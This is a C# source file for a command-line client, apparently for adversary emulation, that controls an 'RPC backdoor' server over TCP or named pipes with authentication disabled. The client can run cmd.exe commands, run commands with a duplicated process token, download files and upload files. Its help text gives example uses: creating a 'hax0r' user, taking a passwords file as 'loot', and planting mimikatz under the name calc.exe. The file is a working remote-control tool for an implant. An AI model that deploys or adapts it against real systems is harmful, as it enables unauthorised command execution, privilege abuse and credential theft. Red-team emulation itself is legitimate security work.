using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using rpc_fa161e81_6e93_4f41_961c_ee9c2e75de17_1_0;

namespace RpcSharpClient
{
    internal class Program
    {
        static void PrintHelp()
        {
            Console.Write("RPC Backdoor Emulation\n");
            Console.Write("\n");
            Console.Write("Target information:\n");
            Console.Write("  --protocol\n");
            Console.Write("    Can be 'tcp' for RPC over TCP/IP or 'namedpipe' for RPC over Named Pipes \n");
            Console.Write("  --hostname\n");
            Console.Write("    Specifies the hostname or IP address of the target RPC server\n");
            Console.Write("  --port\n");
            Console.Write("    Specifies the port number of the target RPC server (required for TCP)\n");
            Console.Write("  --pipename\n");
            Console.Write("    Specifies the pipe name of the target RPC server (required for named pipes)\n");
            Console.Write("\n");
            Console.Write("Functions:\n");
            Console.Write("  The function to be executed is passed via the --function argument.\n");
            Console.Write("  The following functions are implemented:\n");
            Console.Write("    * execute\n");
            Console.Write("    * executewithtoken\n");
            Console.Write("    * download\n");
            Console.Write("    * upload\n");
            Console.Write("    * shutdown\n");
            Console.Write("    \n");
            Console.Write("  Execute\n");
            Console.Write("    The execute function executes a command using 'cmd.exe /c ...'.\n");
            Console.Write("    The --command argument is required. If the commands contains any spaces, wrap it in double quotes (\").\n");
            Console.Write("    \n");
            Console.Write("  Execute with token\n");
            Console.Write("    The execute with token function duplicates the token of a given process ID and executes a command using 'cmd.exe /c ...' via the CreateProcessWithTokenW function.\n");
            Console.Write("    The --command argument is required. If the commands contains any spaces, wrap it in double quotes (\").\n");
            Console.Write("    The --pid argument is required. This argument specifies the process ID of which the token will be duplicated. Make sure the RPC server run in a security context with the permissions and privileges required.\n");
            Console.Write("    \n");
            Console.Write("  Download\n");
            Console.Write("    The download function downloads a file from the RPC server and saves it locally. The file is Base64 encoded/decoded in the process.\n");
            Console.Write("    The --remotepath argument specifies the path of the file to be downloaded (used by the server to read the file).\n");
            Console.Write("    The --localpath argument specifies the path of the file to be saved (used by the client to save the file).\n");
            Console.Write("\n");
            Console.Write("  Upload\n");
            Console.Write("    The upload function uploaded a file to the RPC server and saves it remotely. The file is Base64 encoded/decoded in the process.\n");
            Console.Write("    The --remotepath argument specifies the path of the file to be uploaded (used by the server to save the file).\n");
            Console.Write("    The --localpath argument specifies the path of the file to be uploaded (used by the client to read the file).\n");
            Console.Write("    \n");
            Console.Write("  Shutdown\n");
            Console.Write("    The shutdown function instructs the RPC server to terminate the RPC server and exit the thread.\n");
            Console.Write("    \n");
            Console.Write("Examples:\n");
            Console.Write("  Execute a command:\n");
            Console.Write("  RpcSharpClient.exe --protocol namedpipe --hostname 192.168.70.130 --pipename \"\\pipe\\atctl\" --function execute --command \"net user hax0r /add\"\n");
            Console.Write("  \n");
            Console.Write("  Execute a command with the token of a process with the ID 1220:\n");
            Console.Write("  RpcSharpClient.exe --protocol tcp --hostname 192.168.70.130 --port 4747 --function executewithtoken --command \"net user hax0r /add\" --pid 1220\n");
            Console.Write("  \n");
            Console.Write("  Download a file:\n");
            Console.Write("  RpcSharpClient.exe --protocol namedpipe --hostname 192.168.70.130 --pipename \"\\pipe\\atctl\" --function download --localpath \"loot\\passwords.txt\" --remotepath \"secrets\\passwords.txt\"\n");
            Console.Write("  \n");
            Console.Write("  Upload a file:\n");
            Console.Write("  RpcSharpClient.exe --protocol namedpipe --hostname 192.168.70.130 --pipename \"\\pipe\\atctl\" --function upload --localpath \"Tools\\mimikatz.exe\" --remotepath \"calc.exe\"\n");
            Console.Write("");
        }


        static void Main(string[] args)
        {
            string protocol = null;
            string endpoint = null;
            string hostname = null;
            string function = null;
            string command = null;
            string pid = null;
            string remotepath = null;
            string localpath = null;
            string data = null;
            string protocol_seq = null;

            // If not enough arguments are provided, print help and exit
            if (args.Length < 2)
            {
                PrintHelp();
                return;
            }

            // Parse command line arguments
            for (int i = 0; i < args.Length; i += 2)
            {
                // Every flag is expected to be followed by a value
                if (i + 1 >= args.Length)
                {
                    Console.WriteLine("Error: Incorrent number of arguments. See instructions below.");
                    PrintHelp();
                    return;
                }

                // Parse all expected arguments
                if (string.Compare("--protocol", args[i]) == 0)
                {
                    protocol = args[i + 1];
                }
                else if (string.Compare("--pipename", args[i]) == 0)
                {
                    endpoint = args[i + 1];
                }
                else if (string.Compare("--hostname", args[i]) == 0)
                {
                    hostname = args[i + 1];
                }
                else if (string.Compare("--port", args[i]) == 0)
                {
                    endpoint = args[i + 1];
                }
                else if (string.Compare("--function", args[i]) == 0)
                {
                    function = args[i + 1];
                }
                else if (string.Compare("--command", args[i]) == 0)
                {
                    command = args[i + 1];
                }
                else if (string.Compare("--pid", args[i]) == 0)
                {
                    pid = args[i + 1];
                }
                else if (string.Compare("--remotepath", args[i]) == 0)
                {
                    remotepath = args[i + 1];
                }
                else if (string.Compare("--localpath", args[i]) == 0)
                {
                    localpath = args[i + 1];
                }
                else if (string.Compare("--data", args[i]) == 0)
                {
                    data = args[i + 1];
                }
            }

            // TCP must be accompanied by a hostname and a port
            if (string.Compare(protocol, "tcp") == 0)
            {
                if (hostname == null || endpoint == null)
                {
                    Console.WriteLine("Error: TCP requires providing a hostname/IP address and a port. See instructions below.");
                    PrintHelp();
                    return;
                }
                else
                {
                    protocol_seq = "ncacn_ip_tcp";
                }
            }
            // named pipes must be accompanied by a hostname and a pipename
            else if (string.Compare(protocol, "namedpipe") == 0)
            {
                if (endpoint == null || hostname == null)
                {
                    Console.WriteLine("Error: Named pipe requires providing a hostname and a pipe name. See instructions below.");
                    PrintHelp();
                    return;
                }
                else
                {
                    protocol_seq = "ncacn_np";
                }
            }

            // Establish a connection
            Client client = new Client();
            NtApiDotNet.SecurityQualityOfService qos = new NtApiDotNet.SecurityQualityOfService(NtApiDotNet.SecurityImpersonationLevel.Anonymous, NtApiDotNet.SecurityContextTrackingMode.Static, false);
            qos.ImpersonationLevel = NtApiDotNet.SecurityImpersonationLevel.Identification;
            qos.EffectiveOnly = false;
            qos.ContextTrackingMode = NtApiDotNet.SecurityContextTrackingMode.Static;
            NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity rts = new NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity(qos);
            rts.AuthenticationLevel = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationLevel.None;
            try
            {
                client.Connect(protocol_seq, endpoint, hostname, rts);
            }
            catch(Exception e)
            {
                Console.WriteLine("Failed to establish a connection: {0}", e.Message);
            }

            try
            {
                // The execute call must be accompanied by a command
                if (string.Compare(function, "execute") == 0)
                {
                    if (command == null)
                    {
                        Console.WriteLine("Error: The execute command requires providing a command. See instructions below.");
                        PrintHelp();
                    }
                    else
                    {
                        string output = "";
                        Console.WriteLine("[+] Sending Execute command: {0}", command);
                        client.Execute(command, out output);
                        Console.WriteLine("[+] Execute command result: {0}", output);
                    }
                }
                // The executewithtoken call must be accompanied by a command and a pid
                else if (string.Compare(function, "executewithtoken") == 0)
                {
                    if (command == null || pid == null)
                    {
                        Console.WriteLine("Error: The execute command requires providing a command and a process id (pid). See instructions below.");
                        PrintHelp();
                    }
                    else
                    {
                        int processId;
                        if (int.TryParse(pid, out processId) == false)
                        {
                            Console.WriteLine("Invalid process ID was provided: {0}", pid);
                        }
                        else
                        {
                            string output = "";
                            Console.WriteLine("[+] Sending Execute command: {0}", command);
                            client.ExecuteWithToken(command, processId, out output);
                            Console.WriteLine("[+] Execute command result: {0}", output);
                        }
                    }
                }
                // The download call must be accompanied by a localpath and a remotepath
                else if (string.Compare(function, "download") == 0)
                {
                    if (localpath == null || remotepath == null)
                    {
                        Console.WriteLine("Error: The download command requires providing a remote path (remotepath) for the file to download and a local path (localpath) where the file will be saved. See instructions below.");
                        PrintHelp();
                    }
                    else
                    {
                        string output = null;
                        Console.WriteLine("[+] Sending Download command: {0}", remotepath);
                        client.Download(remotepath, out output);
                        Console.WriteLine("[+] Saving to file:", localpath);
                        File.WriteAllBytes(localpath, Convert.FromBase64String(output));
                    }
                }
                // The upload call must be accompanied by a localpath and a remotepath
                else if (string.Compare(function, "upload") == 0)
                {
                    if (localpath == null || remotepath == null)
                    {
                        Console.WriteLine("Error: The upload command requires providing a local path (localpath) for the file to upload and a remote path (remotepath) where the file will be saved on the remote system. See instructions below.");
                        PrintHelp();
                    }
                    else
                    {
                        byte[] file = File.ReadAllBytes(localpath);
                        string encodedFile = Convert.ToBase64String(file);
                        Console.WriteLine("[+] Sending Upload command: ", remotepath);
                        client.Upload(remotepath, encodedFile);
                        Console.WriteLine("[+] Upload complete: {0} bytes sent", file.Length);
                    }
                }
                // The shutdown call doesn't require any additional arguments
                else if (string.Compare(function, "shutdown") == 0)
                {
                    client.Shutdown();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Runtime error: {0}", e.Message);
            }
            finally
            {
                client.Disconnect();
            }
        }
    }
}
